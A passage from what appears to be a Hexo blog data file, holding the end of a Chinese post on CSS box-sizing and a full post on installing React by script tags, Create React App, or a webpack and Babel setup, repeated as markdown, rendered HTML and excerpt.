，绘制到屏幕上时的盒子宽度和高度会加上设置的边框和内边距值。这意味着当你调整一个元素的宽度和高度时需要时刻注意到这个元素的边框和内边距。当我们实现响应式布局时，这个特点尤其烦人。</p>\n<p>box-sizing 属性可以被用来调整这些表现:</p>\n<ul>\n<li>content-box 是默认值。如果你设置一个元素的宽为 100px，那么这个元素的内容区会有 100px 宽，并且任何边框和内边距的宽度都会被增加到最后绘制出来的元素宽度中。</li>\n<li>border-box 告诉浏览器：你想要设置的边框和内边距的值是包含在 width 内的。也就是说，如果你将一个元素的 width 设为 100px，那么这 100px 会包含它的 border 和 padding，内容区的实际宽度是 width 减去(border + padding)的值。大多数情况下，这使得我们更容易地设定一个元素的宽高。</li>\n</ul>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/CSS/box-sizing\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/zh-CN/docs/Web/CSS/box-sizing</a></p>"},{"title":"React安装使用","date":"2019-07-03T00:00:07.000Z","updated":"2019-07-03T00:00:07.000Z","_content":"\n# 概述\n\n介绍 React 的各种安装使用方式，从网页直接使用，到脚手架，再到用打包工具webpack自己搭建。\n\n<!-- more -->\n\n# 详述\n\n## 安装\n\n### 网页中直接使用\n\n一个 DOM 容器，一个 React 组件，三个 Script 标签。\n\n```html\n<!-- ... 其它 HTML ... -->\n\n<div id=\"like_button_container\"></div>\n\n<!-- ... 其它 HTML ... -->\n```\n\n```js\n'use strict';\n\nconst e = React.createElement;\n\nclass LikeButton extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { liked: false };\n  }\n\n  render() {\n    if (this.state.liked) {\n      return 'You liked this.';\n    }\n\n    return e(\n      'button',\n      { onClick: () => this.setState({ liked: true }) },\n      'Like'\n    );\n  }\n}\n\nconst domContainer = document.querySelector('#like_button_container');\nReactDOM.render(e(LikeButton), domContainer);\n```\n\n```html\n  <!-- ... 其它 HTML ... -->\n\n  <!-- 加载 React。-->\n  <!-- 注意: 部署时，将 \"development.js\" 替换为 \"production.min.js\"。-->\n  <script src=\"https://unpkg.com/react@16/umd/react.development.js\" crossorigin></script>\n  <script src=\"https://unpkg.com/react-dom@16/umd/react-dom.development.js\" crossorigin></script>\n\n  <!-- 加载我们的 React 组件。-->\n  <script src=\"like_button.js\"></script>\n\n</body>\n```\n\n#### 可选使用 JSX\n\n```js\n// 显示一个 \"Like\" <button>\nreturn <button onClick={() => this.setState({ liked: true })}>Like</button>;\n```\n\n```shell\nnpm init -y\nnpm install babel-cli@6 babel-preset-react-app@3\n\nnpx babel --watch src --out-dir . --presets react-app/prod\n```\n\n### 创建新的 React 应用\n\n#### Create React App 脚手架\n\n```shell\nnpx create-react-app my-app\ncd my-app\nnpm start\n```\n\n#### webpack 从零搭建\n\n```json\n// package.json\n  \"devDependencies\": {\n    \"@babel/core\": \"^7.4.5\",\n    \"@babel/plugin-transform-runtime\": \"^7.4.4\",\n    \"@babel/preset-env\": \"^7.4.5\",\n    \"@babel/preset-react\": \"^7.0.0\",\n    \"babel-loader\": \"^8.0.6\",\n    \"html-webpack-plugin\": \"^3.2.0\",\n    \"react-redux\": \"^7.1.0\",\n    \"react-router-dom\": \"^5.0.1\",\n    \"redux\": \"^4.0.1\",\n    \"redux-saga\": \"^1.0.4\",\n    \"webpack\": \"^4.35.0\",\n    \"webpack-cli\": \"^3.3.5\",\n    \"webpack-dev-server\": \"^3.7.2\"\n  },\n  \"dependencies\": {\n    \"react\": \"^16.8.6\",\n    \"react-dom\": \"^16.8.6\"\n  }\n```\n\n```json\n// .babelrc\n{\n  \"presets\": [\"@babel/preset-env\", \"@babel/preset-react\"],\n  \"plugins\": [\n    [\n      \"@babel/plugin-transform-runtime\",\n      {\n        \"corejs\": false,\n        \"helpers\": true,\n        \"regenerator\": true,\n        \"useESModules\": false\n      }\n    ]\n  ]\n}\n```\n\n```js\n// webpack.config.js\n  module: {\n    rules: [\n      {\n        test: /\\.js$/,\n        exclude: /node_modules/,\n        use: {\n          loader: 'babel-loader'\n        }\n      }\n    ]\n  },\n```\n\n# 参考\n\nhttps://zh-hans.reactjs.org/docs/getting-started.html\n","source":"_posts/2019/07/react-hello.md","raw":"---\ntitle: React安装使用\npermalink: react-hello\ntags:\n  - React\ncategories:\n  - 框架与库\n  - React\ndate: 2019-07-03 08:00:07\nupdated: 2019-07-03 08:00:07\n---\n\n# 概述\n\n介绍 React 的各种安装使用方式，从网页直接使用，到脚手架，再到用打包工具webpack自己搭建。\n\n<!-- more -->\n\n# 详述\n\n## 安装\n\n### 网页中直接使用\n\n一个 DOM 容器，一个 React 组件，三个 Script 标签。\n\n```html\n<!-- ... 其它 HTML ... -->\n\n<div id=\"like_button_container\"></div>\n\n<!-- ... 其它 HTML ... -->\n```\n\n```js\n'use strict';\n\nconst e = React.createElement;\n\nclass LikeButton extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { liked: false };\n  }\n\n  render() {\n    if (this.state.liked) {\n      return 'You liked this.';\n    }\n\n    return e(\n      'button',\n      { onClick: () => this.setState({ liked: true }) },\n      'Like'\n    );\n  }\n}\n\nconst domContainer = document.querySelector('#like_button_container');\nReactDOM.render(e(LikeButton), domContainer);\n```\n\n```html\n  <!-- ... 其它 HTML ... -->\n\n  <!-- 加载 React。-->\n  <!-- 注意: 部署时，将 \"development.js\" 替换为 \"production.min.js\"。-->\n  <script src=\"https://unpkg.com/react@16/umd/react.development.js\" crossorigin></script>\n  <script src=\"https://unpkg.com/react-dom@16/umd/react-dom.development.js\" crossorigin></script>\n\n  <!-- 加载我们的 React 组件。-->\n  <script src=\"like_button.js\"></script>\n\n</body>\n```\n\n#### 可选使用 JSX\n\n```js\n// 显示一个 \"Like\" <button>\nreturn <button onClick={() => this.setState({ liked: true })}>Like</button>;\n```\n\n```shell\nnpm init -y\nnpm install babel-cli@6 babel-preset-react-app@3\n\nnpx babel --watch src --out-dir . --presets react-app/prod\n```\n\n### 创建新的 React 应用\n\n#### Create React App 脚手架\n\n```shell\nnpx create-react-app my-app\ncd my-app\nnpm start\n```\n\n#### webpack 从零搭建\n\n```json\n// package.json\n  \"devDependencies\": {\n    \"@babel/core\": \"^7.4.5\",\n    \"@babel/plugin-transform-runtime\": \"^7.4.4\",\n    \"@babel/preset-env\": \"^7.4.5\",\n    \"@babel/preset-react\": \"^7.0.0\",\n    \"babel-loader\": \"^8.0.6\",\n    \"html-webpack-plugin\": \"^3.2.0\",\n    \"react-redux\": \"^7.1.0\",\n    \"react-router-dom\": \"^5.0.1\",\n    \"redux\": \"^4.0.1\",\n    \"redux-saga\": \"^1.0.4\",\n    \"webpack\": \"^4.35.0\",\n    \"webpack-cli\": \"^3.3.5\",\n    \"webpack-dev-server\": \"^3.7.2\"\n  },\n  \"dependencies\": {\n    \"react\": \"^16.8.6\",\n    \"react-dom\": \"^16.8.6\"\n  }\n```\n\n```json\n// .babelrc\n{\n  \"presets\": [\"@babel/preset-env\", \"@babel/preset-react\"],\n  \"plugins\": [\n    [\n      \"@babel/plugin-transform-runtime\",\n      {\n        \"corejs\": false,\n        \"helpers\": true,\n        \"regenerator\": true,\n        \"useESModules\": false\n      }\n    ]\n  ]\n}\n```\n\n```js\n// webpack.config.js\n  module: {\n    rules: [\n      {\n        test: /\\.js$/,\n        exclude: /node_modules/,\n        use: {\n          loader: 'babel-loader'\n        }\n      }\n    ]\n  },\n```\n\n# 参考\n\nhttps://zh-hans.reactjs.org/docs/getting-started.html\n","slug":"react-hello","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8y40084wovvik3fqv6k","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>介绍 React 的各种安装使用方式，从网页直接使用，到脚手架，再到用打包工具webpack自己搭建。</p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><h3 id=\"网页中直接使用\"><a href=\"#网页中直接使用\" class=\"headerlink\" title=\"网页中直接使用\"></a>网页中直接使用</h3><p>一个 DOM 容器，一个 React 组件，三个 Script 标签。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- ... 其它 HTML ... --&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">\"like_button_container\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- ... 其它 HTML ... --&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">'use strict'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> e = React.createElement;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">LikeButton</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(props) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>(props);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.state = &#123; <span class=\"attr\">liked</span>: <span class=\"literal\">false</span> &#125;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.state.liked) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"string\">'You liked this.'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> e(</span><br><span class=\"line\">      <span class=\"string\">'button'</span>,</span><br><span class=\"line\">      &#123; <span class=\"attr\">onClick</span>: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> <span class=\"keyword\">this</span>.setState(&#123; <span class=\"attr\">liked</span>: <span class=\"literal\">true</span> &#125;) &#125;,</span><br><span class=\"line\">      <span class=\"string\">'Like'</span></span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> domContainer = <span class=\"built_in\">document</span>.querySelector(<span class=\"string\">'#like_button_container'</span>);</span><br><span class=\"line\">ReactDOM.render(e(LikeButton), domContainer);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"comment\">&lt;!-- ... 其它 HTML ... --&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- 加载 React。--&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- 注意: 部署时，将 \"development.js\" 替换为 \"production.min.js\"。--&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://unpkg.com/react@16/umd/react.development.js\"</span> <span class=\"attr\">crossorigin</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://unpkg.com/react-dom@16/umd/react-dom.development.js\"</span> <span class=\"attr\">crossorigin</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- 加载我们的 React 组件。--&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"like_button.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"可选使用-JSX\"><a href=\"#可选使用-JSX\" class=\"headerlink\" title=\"可选使用 JSX\"></a>可选使用 JSX</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 显示一个 \"Like\" &lt;button&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">onClick</span>=<span class=\"string\">&#123;()</span> =&gt;</span> this.setState(&#123; liked: true &#125;)&#125;&gt;Like<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span>;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm init -y</span><br><span class=\"line\">npm install babel-cli@6 babel-preset-react-app@3</span><br><span class=\"line\"></span><br><span class=\"line\">npx babel --watch src --out-dir . --presets react-app/prod</span><br></pre></td></tr></table></figure>\n<h3 id=\"创建新的-React-应用\"><a href=\"#创建新的-React-应用\" class=\"headerlink\" title=\"创建新的 React 应用\"></a>创建新的 React 应用</h3><h4 id=\"Create-React-App-脚手架\"><a href=\"#Create-React-App-脚手架\" class=\"headerlink\" title=\"Create React App 脚手架\"></a>Create React App 脚手架</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npx create-react-app my-app</span><br><span class=\"line\">cd my-app</span><br><span class=\"line\">npm start</span><br></pre></td></tr></table></figure>\n<h4 id=\"webpack-从零搭建\"><a href=\"#webpack-从零搭建\" class=\"headerlink\" title=\"webpack 从零搭建\"></a>webpack 从零搭建</h4><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// package.json</span><br><span class=\"line\">  \"devDependencies\": &#123;</span><br><span class=\"line\">    \"@babel/core\": \"^7.4.5\",</span><br><span class=\"line\">    \"@babel/plugin-transform-runtime\": \"^7.4.4\",</span><br><span class=\"line\">    \"@babel/preset-env\": \"^7.4.5\",</span><br><span class=\"line\">    \"@babel/preset-react\": \"^7.0.0\",</span><br><span class=\"line\">    \"babel-loader\": \"^8.0.6\",</span><br><span class=\"line\">    \"html-webpack-plugin\": \"^3.2.0\",</span><br><span class=\"line\">    \"react-redux\": \"^7.1.0\",</span><br><span class=\"line\">    \"react-router-dom\": \"^5.0.1\",</span><br><span class=\"line\">    \"redux\": \"^4.0.1\",</span><br><span class=\"line\">    \"redux-saga\": \"^1.0.4\",</span><br><span class=\"line\">    \"webpack\": \"^4.35.0\",</span><br><span class=\"line\">    \"webpack-cli\": \"^3.3.5\",</span><br><span class=\"line\">    \"webpack-dev-server\": \"^3.7.2\"</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  \"dependencies\": &#123;</span><br><span class=\"line\">    \"react\": \"^16.8.6\",</span><br><span class=\"line\">    \"react-dom\": \"^16.8.6\"</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// .babelrc</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"presets\"</span>: [<span class=\"string\">\"@babel/preset-env\"</span>, <span class=\"string\">\"@babel/preset-react\"</span>],</span><br><span class=\"line\">  <span class=\"attr\">\"plugins\"</span>: [</span><br><span class=\"line\">    [</span><br><span class=\"line\">      <span class=\"string\">\"@babel/plugin-transform-runtime\"</span>,</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"attr\">\"corejs\"</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"helpers\"</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"regenerator\"</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">        <span class=\"attr\">\"useESModules\"</span>: <span class=\"literal\">false</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// webpack.config.js</span></span><br><span class=\"line\">  <span class=\"built_in\">module</span>: &#123;</span><br><span class=\"line\">    rules: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        test: <span class=\"regexp\">/\\.js$/</span>,</span><br><span class=\"line\">        exclude: <span class=\"regexp\">/node_modules/</span>,</span><br><span class=\"line\">        use: &#123;</span><br><span class=\"line\">          loader: <span class=\"string\">'babel-loader'</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;,</span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://zh-hans.reactjs.org/docs/getting-started.html\" target=\"_blank\" rel=\"noopener\">https://zh-hans.reactjs.org/docs/getting-started.html</a></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>介绍 React 的各种安装使用方式，从网页直接使用，到脚手架，再到用打包工具webpack自己搭建。</p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><h3 id=\"网页中直接使用\"><a href=\"#网页中直接使用\" class=\"headerlink\" title=\"网页中直接使用\"></a>网页中直接使用</h3><p>一个 DOM 容器，一个 React 组件，三个 Script 标签。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- ... 其它 HTML ... --&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">\"like_button_container\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- ... 其它 HTML ... --&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">'use strict'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> e = React.createElement;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">LikeButton</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(props) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>(props);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.state = &#123; <span class=\"attr\">liked</span>: <span class=\"literal\">false</span> &#125;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.state.liked) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"string\">'You liked this.'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> e(</span><br><span class=\"line\">      <span class=\"string\">'button'</span>,</span><br><span class=\"line\">      &#123; <span class=\"attr\">onClick</span>: <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> <span class=\"keyword\">this</span>.setState(&#123; <span class=\"attr\">liked</span>: <span class=\"literal\">true</span> &#125;) &#125;,</span><br><span class=\"line\">      <span class=\"string\">'Like'</span></span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> domContainer = <span class=\"built_in\">document</span>.querySelector(<span class=\"string\">'#like_button_container'</span>);</span><br><span class=\"line\">ReactDOM.render(e(LikeButton), domContainer);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"comment\">&lt;!-- ... 其它 HTML ... --&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- 加载 React。--&gt;</span></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- 注意: 部署时，将 \"development.js\" 替换为 \"production.min.js\"。--&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://unpkg.com/react@16/umd/react.development.js\"</span> <span class=\"attr\">crossorigin</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://unpkg.com/react-dom@16/umd/react-dom.development.js\"</span> <span class=\"attr\">crossorigin</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">&lt;!-- 加载我们的 React 组件。--&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"like_button.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"可选使用-JSX\"><a href=\"#可选使用-JSX\" class=\"headerlink\" title=\"可选使用 JSX\"></a>可选使用 JSX</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 显示一个 \"Like\" &lt;button&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">onClick</span>=<span class=\"string\">&#123;()</span> =&gt;</span> this.setState(&#123; liked: true &#125;)&#125;&gt;Like<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span>;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm init -y</span><br><span class=\"line\">npm install babel-cli@6 babel-preset-react-app@3</span><br><span class=\"line\"></span><br><span class=\"line\">npx babel --watch src --out-dir . --presets react-app/prod</span><br></pre></td></tr></table></figure>\n<h3 id=\"创建新的-React-应用\"><a href=\"#创建新的-React-应用\" class=\"headerlink\" title=\"创建新的 React 应用\"></a>创建新的 React 应用</h3><h4 id=\"Create-React-App-脚手架\"><a href=\"#Create-React-App-脚手架\" class=\"headerlink\" title=\"Create React App 脚手架\"></a>Create React App 脚手架</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npx create-react-app my-app</span><br><span class=\"line\">cd my-app</span><br><span class=\"line\">npm start</span><br></pre></td></tr></table></figure>\n<h4 id=\"webpack-从零搭建\"><a href=\"#webpack-从零搭建\" class=\"headerlink\" title=\"webpack 从零搭建\"></a>webpack 从零搭建</h4><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// package.json</span><br><span class=\"line\">  \"devDependencies\": &#123;</span><br><span class=\"line\">    \"@babel/core\": \"^7.4.5\",</span><br><span class=\"line\">    \"@babel/plugin-transform-runtime\": \"^7.4.4\",</span><br><span class=\"line\">    \"@babel/preset-env\": \"^7.4.5\",</span><br><span class=\"line\">    \"@babel/preset-react\": \"^7.0.0\",</span><br><span class=\"line\">    \"babel-loader\": \"^8.0.6\",</span><br><span class=\"line\">    \"html-webpack-plugin\": \"^3.2.0\",</span><br><span class=\"line\">    \"react-redux\": \"^7.1.0\",</span><br><span class=\"line\">    \"react-router-dom\": \"^5.0.1\",</span><br><span class=\"line\">    \"redux\": 